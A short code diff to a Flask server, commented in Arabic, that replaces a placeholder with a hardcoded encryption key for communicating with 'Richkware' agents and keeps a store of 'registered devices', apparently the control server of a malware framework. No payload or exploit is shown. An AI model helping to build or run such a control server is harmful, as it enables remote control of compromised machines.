@@ -12,7 +12,7 @@ app = Flask(__name__)
 
 # ==================== إعدادات Richkware ====================
 # Richkware يتوقع تواصل مشفر بمفتاح معين
-ENCRYPTION_KEY = "secure_key_from_environment"  # نفس اللي في agent.hpp
+ENCRYPTION_KEY = "7Fd3#9Lk2$mP5@nQ8!rT4&yU6*zX1"  # نفس اللي في agent.hpp
 
 # تخزين البيانات
 agents = {}  # الأجهزة المسجلة
